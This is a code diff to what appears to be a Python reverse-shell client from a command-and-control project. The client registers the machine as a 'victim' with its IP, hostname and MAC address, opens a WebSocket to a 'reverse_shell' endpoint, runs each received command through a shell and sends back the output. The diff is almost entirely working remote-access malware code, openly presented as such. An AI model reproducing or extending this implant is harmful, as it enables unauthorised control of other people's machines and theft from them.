@@ -5,8 +5,7 @@ import uuid
 import socket
 import subprocess
 from api import Client as Api
-import websockets
-import asyncio
+import websocket
 
 
 class Client(object):
@@ -39,19 +38,17 @@ class Client(object):
 
     def connect_to_web_server(self):
         username = self.mac_address.replace(':', '')
-        response = self.api.login(username, self.mac_address)
+        response, self.session_id = self.api.login(username, self.mac_address)
         if response.status_code == 401:
             self.api.register(username, self.mac_address)
-        response = self.api.create_victim(self.host_ip, self.port, self.host_name, self.mac_address, username)
-        if response.status_code == 400:
-            self.api.update_victim(self.mac_address, data={'logged_in': True})
-        # self.connect_to_attacker()
+            response, self.session_id = self.api.login(username, self.mac_address)
+        self.api.create_victim(self.host_ip, self.port, self.host_name, self.mac_address, username)
 
     def connect_socket(self, ip, port):
         self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.client.connect((ip, port))
 
-    async def execute_command(self, command):
+    def execute_command(self, command):
         if command == 'quit':
             print("quitting...")
             self.client.close()
@@ -62,20 +59,21 @@ class Client(object):
                 command[:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE
             )
             output_bytes = command.stdout.read()
-            output_str = f'{os.getcwd()}${str(output_bytes, "utf-8")}'
+            output_str = f'{os.getcwd()}$ {str(output_bytes, "utf-8")}'
         return output_str
 
-    async def hello(self):
-        uri = "ws://localhost:8000/ws/reverse_shell/connect/lobby/"
-        async with websockets.connect(uri) as websocket:
-            while True:
-                data = await websocket.recv()
-                command = json.loads(data)['message']
-                output = await self.execute_command(command)
-                await websocket.send(json.dumps({'message': output}))
+    def main(self):
+        ws = websocket.create_connection("ws://localhost:8000/ws/reverse_shell/connect/",
+                                         cookie=f'sessionid={self.session_id}')
+        while True:
+            data = ws.recv()
+            json_data = json.loads(data)
+            command = json_data['message']
+            output = self.execute_command(command)
+            ws.send(json.dumps({'message': output}))
 
 
 if __name__ == '__main__':
     client = Client()
     client.connect_to_web_server()
-    asyncio.get_event_loop().run_until_complete(client.hello())
+    client.main()
